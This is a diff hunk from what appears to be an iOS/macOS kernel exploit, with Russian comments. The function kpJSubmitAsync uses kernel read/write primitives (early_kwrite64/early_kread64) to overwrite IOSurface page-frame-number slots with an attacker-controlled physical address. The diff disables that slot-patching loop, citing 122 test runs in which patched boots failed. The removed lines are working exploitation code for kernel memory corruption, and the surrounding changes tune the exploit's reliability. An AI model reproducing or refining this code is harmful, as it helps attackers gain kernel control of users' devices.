@@ -6542,26 +6542,12 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             }
             if (nSlots) {
                 rangesVA = slotVAs[0];   // совместимость со старым кодом ниже
-                int stuck = 0;
-                for (int j = 0; j < nSlots; j++) {
-                    uint64_t newQ = (slotForm[j] == 1)
-                                  ? (((uint64_t)ctlPFN << 32) | (origQs[j] & 0xFFFFFFFFULL))
-                                  : (slotForm[j] == 2) ? ctlPA
-                                  : (slotForm[j] == 3) ? (ctlPA >> 14)
-                                  : (slotForm[j] == 5) ? ((origQs[j] & 0xFFFF000000000000ULL) | ctlPA)
-                                  : (slotForm[j] == 6) ? ((origQs[j] & ~0x000003FFFE000000ULL) | (ctlPA & 0x000003FFFE000000ULL))
-                                  : ((origQs[j] & 0xFFFFFFFF00000000ULL) | (uint64_t)ctlPFN);
-                    newQs[j] = newQ;
-                    early_kwrite64(slotVAs[j], newQ);
-                    uint64_t rb = early_kread64(slotVAs[j]);
-                    if (rb == newQ) stuck++;
-                    kpNote(r, [NSString stringWithFormat:@"  ПОДМЕНА слот#%d %#018llx → %#018llx — %@",
-                              j, (unsigned long long)origQs[j], (unsigned long long)newQ,
-                              rb == newQ ? @"ПРИЛИПЛО" : @"НЕ прилипло"]);
-                }
-                kpNote(r, [NSString stringWithFormat:@"  ★ surfVA=%#llx, пропатчено %d/%d слотов ДО submit",
-                          (unsigned long long)surfVA, stuck, nSlots]);
-                if (!stuck) nSlots = 0;   // запись не липнет — откат к старым путям
+                // 1.9.265: запись слотов ВЫКЛЮЧЕНА — таблица по 122 прогонам захвата:
+                // проигрышные буты = те, где слот нашёлся и был пропатчен; победные
+                // = без слота (nSlots=0). Патч {ctlPFN<<32|count} ломал запись в них.
+                kpNote(r, [NSString stringWithFormat:@"  ★ surfVA=%#llx, слотов найдено %d — НЕ ПАТЧИМ (патч ломал запись в таких бутах, таблица 122 прогонов)",
+                          (unsigned long long)surfVA, nSlots]);
+                nSlots = 0;
             } else {
                 kpNote(r, @"  IOSurface найден, но pfn-слотов нет — уходим в старые пути");
             }
